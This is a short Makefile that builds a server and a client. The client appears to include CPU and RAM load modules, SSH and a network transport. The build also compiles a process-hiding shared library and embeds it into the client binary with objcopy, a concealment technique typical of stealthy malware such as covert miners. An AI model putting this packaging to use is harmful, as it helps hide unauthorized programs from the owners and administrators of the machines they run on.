CC = gcc

CFLAGS = -Wall -Wextra -pthread -D_GNU_SOURCE -fPIE
LDLIBS = -lcjson -lm -lssh2
LDFLAGS = -ldl -no-pie

SERVER = server
CLIENT = main
HIDER_LIB = libprocesshider.so
HIDER_SRC = processhider.c

SERVER_SRC = server.c
CLIENT_SRC = main.c process_control.c config.c load_cpu.c load_ram.c network_transport.c

all: $(HIDER_LIB) $(SERVER) $(CLIENT)

$(HIDER_LIB): $(HIDER_SRC)
	$(CC) -shared -fPIC $(HIDER_SRC) -o $(HIDER_LIB) -ldl

$(SERVER): $(SERVER_SRC)
	$(CC) $(CFLAGS) $(SERVER_SRC) -o $(SERVER)

$(CLIENT): $(CLIENT_SRC) $(HIDER_LIB)
	$(CC) $(CFLAGS) -c $(CLIENT_SRC) $(LDFLAGS) $(LDLIBS)
	objcopy --input-target binary --output-target elf64-x86-64 \
	        --rename-section .data=.rodata,alloc,load,readonly,data,contents \
	        $(HIDER_LIB) hider_data.o
	$(CC) $(CFLAGS) *.o -o $(CLIENT) $(LDFLAGS) $(LDLIBS)
	rm -f main.o process_control.o


clean:
	rm -f $(SERVER) $(CLIENT)